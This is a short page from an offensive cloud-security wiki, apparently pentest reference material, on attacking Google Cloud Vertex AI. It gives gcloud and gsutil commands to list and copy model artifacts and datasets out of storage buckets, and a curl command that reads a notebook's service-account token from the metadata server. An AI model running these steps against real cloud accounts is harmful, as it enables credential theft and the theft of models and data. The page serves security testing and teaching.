---
title: "Vertex AI: notebook and training-job service accounts and model theft"
order: 3
description: "Attacking Vertex AI: notebook and training-job service accounts, model and dataset theft, and pipeline execution."
keywords:
  - Vertex AI
  - notebook
  - training job
  - model theft
  - service account
  - ML
---

# Vertex AI

Vertex AI is GCP's managed ML platform, and it is attacked two ways: for the **data and models** it holds (training datasets, tuned model artifacts in GCS), and as **compute that runs under a service account**. A managed notebook or a custom training job runs as an attached service account, so creating one is a deploy-as-service-account path, and the notebook's metadata server hands out that account's token.

## Model and dataset theft

```bash
gcloud ai models list --region <region>
gcloud ai models upload --help     # (inverse: export/download artifacts from the model's GCS URI)
gsutil -m cp -r gs://<model-bucket>/ .      # pull the artifacts the model points at
gcloud ai datasets list --region <region>
```

## Notebook as a service-account foothold

```bash
# a notebook runs as --service-account; from inside it, read the token
curl -s -H 'Metadata-Flavor: Google' \
  'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'
```

## Exploitation notes

- Creating a notebook or training job with a privileged `--service-account` is the privesc angle and is covered as [actAs: Vertex AI notebook](../identity/privilege-escalation/act-as-deployment/vertex-ai-notebook.md); this page is the data and model theft.
- Model artifacts and training data live in GCS buckets; the Vertex objects point at them, so bucket access often shortcuts the whole service.

## Tools

- **gcloud** (`ai models`, `ai custom-jobs`, `notebooks instances`).
- **gsutil**: pull model and dataset artifacts from GCS.

## References

- [HackTricks Cloud: GCP Vertex AI](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/index.html)
- [Hacking the Cloud: GCP](https://hackingthe.cloud/)
- [Google Cloud: Vertex AI access control](https://cloud.google.com/vertex-ai/docs/general/access-control)
